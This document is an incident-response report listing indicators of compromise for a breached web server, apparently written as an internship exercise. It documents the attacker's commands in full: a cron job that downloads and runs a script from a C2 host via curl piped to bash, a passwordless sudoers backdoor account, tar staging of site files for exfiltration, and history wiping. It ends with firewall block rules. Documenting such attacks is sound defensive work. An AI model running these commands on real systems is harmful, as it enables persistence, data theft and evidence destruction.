# 🚨 Indicators of Compromise (IOCs)
### Host: webserver01 | Incident Date: 10 March 2024

> All network IOCs are documented for threat intelligence reference.
> Block these at your firewall and add to your threat intelligence platform.

---

## Attacker IP Addresses

| IP Address | Role | First Seen | Last Seen | Notes |
|---|---|---|---|---|
| `198.51.100.23` | Attacker source — SSH brute-force + intrusion + backdoor re-entry | 03:14:02 | 12:40 | All malicious SSH sessions |
| `192.0.2.99` | C2 / exfiltration server | 03:20:04 | 03:40:11 | Received stolen data via port 443 |

---

## Malicious URLs

| URL | Purpose | Log Source |
|---|---|---|
| `http://192.0.2.99/update.sh` | Malicious C2 script — downloaded and executed every 10 minutes | syslog (CRON) |

---

## Malicious Cron Entry

```bash
*/10 * * * * curl -s http://192.0.2.99/update.sh | bash
```
- **Location:** Root crontab (`/var/spool/cron/crontabs/root`)
- **Effect:** Downloads and executes attacker-controlled script every 10 minutes
- **First observed executing:** 03:20:04 (syslog)

---

## Compromised & Backdoor Accounts

| Account | Type | UID | Details |
|---|---|---|---|
| `backup` | Compromised service account | Existing | Entry point — brute-forced via SSH password auth |
| `sysupdate` | Backdoor account (attacker-created) | 1002 | Passwordless sudo — persistent root access |

---

## Malicious sudoers Entry

```
sysupdate ALL=(ALL) NOPASSWD:ALL
```
- **File:** `/etc/sudoers`
- **Effect:** Grants `sysupdate` unlimited root access without password

---

## Exfiltrated Data

| Item | Path | Destination | Method |
|---|---|---|---|
| Web application source | `/var/www/html` | `192.0.2.99:443` | tar archive via HTTPS |
| nginx configuration | `/etc/nginx` | `192.0.2.99:443` | tar archive via HTTPS |
| Archive file | `/tmp/.cache_bkp.tar.gz` | Staging before transfer | Hidden filename |

---

## IPTABLES / Network Evidence

| Timestamp | Direction | Source | Destination | Protocol | Flags | Significance |
|---|---|---|---|---|---|---|
| 03:20:05 | OUT | 10.0.0.15 | 192.0.2.99:443 | TCP | SYN | C2 beacon — first connection |
| 03:23:55 | OUT | 10.0.0.15 | 192.0.2.99:443 | TCP | PSH+ACK | Data exfiltration — large packet |
| 03:23:58 | OUT | 10.0.0.15 | 192.0.2.99:443 | TCP | PSH+ACK | Data exfiltration continues |
| 03:24:00 | OUT | 10.0.0.15 | 192.0.2.99:443 | TCP | ACK+FIN | Transfer complete |
| 03:30:07 | OUT | 10.0.0.15 | 192.0.2.99:443 | TCP | SYN | C2 beacon repeat |
| 03:40:12 | OUT | 10.0.0.15 | 192.0.2.99:443 | TCP | SYN | C2 beacon repeat |

---

## Commands Executed by Attacker (from auditd/auth.log)

```bash
# Privilege Reconnaissance
sudo /usr/bin/id
sudo /usr/bin/cat /etc/sudoers

# Privilege Escalation
sudo /bin/bash

# Backdoor Account Creation
useradd sysupdate
passwd sysupdate
usermod -aG sudo sysupdate
echo 'sysupdate ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers

# C2 Persistence
*/10 * * * * curl -s http://192.0.2.99/update.sh | bash

# Data Staging
/bin/tar czf /tmp/.cache_bkp.tar.gz /var/www/html /etc/nginx

# Evidence Destruction
echo > /home/backup/.bash_history
history -c
```

---

## Firewall Block Recommendations

```bash
# Block attacker source IP
iptables -A INPUT  -s 198.51.100.23 -j DROP
iptables -A OUTPUT -d 198.51.100.23 -j DROP

# Block C2 server
iptables -A INPUT  -s 192.0.2.99 -j DROP
iptables -A OUTPUT -d 192.0.2.99 -j DROP

# Save rules
iptables-save > /etc/iptables/rules.v4
```

---

*IOCs documented by: Harmain Shah | Intern ID: CA0200 | Cryptonic Area Internship Program*
